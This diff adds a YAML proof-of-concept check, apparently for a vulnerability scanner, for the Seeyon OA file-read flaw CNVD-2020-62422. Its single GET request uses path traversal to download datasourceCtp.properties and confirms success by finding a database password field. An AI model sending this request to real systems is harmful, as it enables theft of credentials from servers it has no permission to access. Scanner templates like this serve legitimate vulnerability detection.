@@ -1,0 +1,19 @@
+name: yaml-poc-seeyon-seeyon_oa-readfile-CNVD-2020-62422
+binding: 44336f10-74a7-44dc-a822-deaf0188318a
+detail:
+    author: system_user
+    links:
+        - https://www.cnvd.org.cn/flaw/show/CNVD-2020-62422
+    vulnerability:
+        id: 000ff5d0-00f0-40a1-be71-e836d6f2332e
+        level: medium
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties
+            follow_redirects: false
+        expression: response.status == 200 && response.content_type.icontains("application/x-msdownload") && response.body.bcontains(b"ctpDataSource.password")
+expression: r0()
